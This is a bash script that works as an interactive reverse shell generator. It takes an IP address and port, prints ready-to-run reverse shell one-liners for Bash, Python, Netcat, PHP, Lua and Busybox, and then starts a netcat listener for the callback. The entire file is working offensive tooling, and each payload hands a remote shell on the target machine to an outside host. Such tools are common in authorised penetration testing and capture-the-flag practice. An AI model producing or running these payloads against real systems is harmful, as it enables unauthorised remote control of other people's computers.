#!/bin/bash
cat << "EOF"
 ____                _          _ _            
|  _ \ _____   _____| |__   ___| | |           
| |_) / _ \ \ / / __| '_ \ / _ \ | |           
|  _ <  __/\ V /\__ \ | | |  __/ | |           
|_|_\_\___| \_/ |___/_| |_|\___|_|_|           
 / ___| ___ _ __   ___ _ __ __ _| |_ ___  _ __ 
| |  _ / _ \ '_ \ / _ \ '__/ _` | __/ _ \| '__|
| |_| |  __/ | | |  __/ | | (_| | || (_) | |   
 \____|\___|_| |_|\___|_|  \__,_|\__\___/|_|   

EOF
cat << EOF
***** Reverse Shell Generator *****
Please choose your reverse shell type!
(1) Bash
(2) Python
(3) Netcat
(4) Php
(5) Lua
(6) Busybox
EOF
echo "Type in number for type:"
read type
echo "Please paste your ip address:"
read ip_address
echo "Please type your listening port:"
read port
intro="***** REVERSE SHELL PAYLOAD *****"
listener="***** LISTENER *****"

if [[ $ip_address == "" || $port == "" ]]; then
  echo "You need to enter your ip address and port!"
  exit 1
fi
if [[ $type == "1" ]]; then
cat << EOF
$intro

bash -i >& /dev/tcp/$ip_address/$port 0>&1

$listener
EOF
elif [[ $type == "2" ]]; then
cat << EOF
$intro

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip_address",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

$listener
EOF
elif [[ $type == "3" ]]; then
cat << EOF
$intro

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $ip_address $port >/tmp/f

$listener
EOF
elif [[ $type == "4" ]]; then
cat << EOF
$intro

php -r '\$sock=fsockopen("$ip_address",$port);system("bash <&3 >&3 2>&3");'

$listener
EOF
elif [[ $type == "5" ]]; then
cat << EOF
$intro

lua -e "require('socket');require('os');t=socket.tcp();t:connect('$ip_address','$port');os.execute('bash -i <&3 >&3 2>&3');"

$listener
EOF
elif [[ $type == "6" ]]; then
cat << EOF
$intro

busybox nc $ip_address $port -e bash

EOF
else
  echo "You need to choose a reverse shell type !!"
  exit 1
fi
echo ""
echo "Press [Enter] to start listening on $port"
read
nc -lvnp $port
